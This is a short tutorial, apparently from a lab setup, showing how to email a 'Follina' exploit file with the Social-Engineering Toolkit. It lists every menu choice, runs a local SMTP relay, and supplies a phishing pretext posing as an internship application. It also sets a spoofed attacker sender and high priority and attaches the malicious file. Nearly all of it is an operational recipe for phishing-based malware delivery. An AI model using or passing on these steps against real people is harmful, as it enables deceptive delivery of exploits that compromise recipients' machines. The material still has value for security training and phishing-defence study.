Use Social Engineering Toolkit (SET) to send follina file to receiver using email.

**Install python3-aiosmtpd to be used as SMTP server**
```
sudo apt update
sudo apt install python3-aiosmtpd -y
```

**Run SMTP server**
```
python3 -m aiosmtpd -n -l 0.0.0.0:25
```

1. **Run as root to use SET.**
```
sudo setoolkit
```

2. **Select Social-Engineering Attacks.**
```
1
```

3. **Select to send malicious file by email.**
```
5
```

4. **Enter 1 to send email to a single email .**
```
1
```

5. **Enter 2 to select one-time use email template.**
```
2
```

6. **Enter subject of email**
```
Internship
```

7. **Set messsage to be sent as html**
```
h
```

8. **Enter body of email.**
```
Hello, my name is ... I want to take an internship at ... here is the file regarding internship.
```

9. **Enter receiver email.**
```
example@gmail.com
```

10. **Enter 2 to use own server or open relay.**
```
2
```

11. **Enter attacker email and what the reciever will see.**
```
attacker@test.com
attacker
```

12. **Set SMTP server address and enter port number for SMTP server**
```
10.0.2.4
25
```

13. **Enter y to flag the email as high priority.**
```
y
```

14. **Enter y to add an attachment.**
```
y
```

15. **Enter path to the follina file from kali side.**

16. **Enter n regarding adding an inline attachment.**
```
n
```

17. **Type "END" to finish**
```
END
```

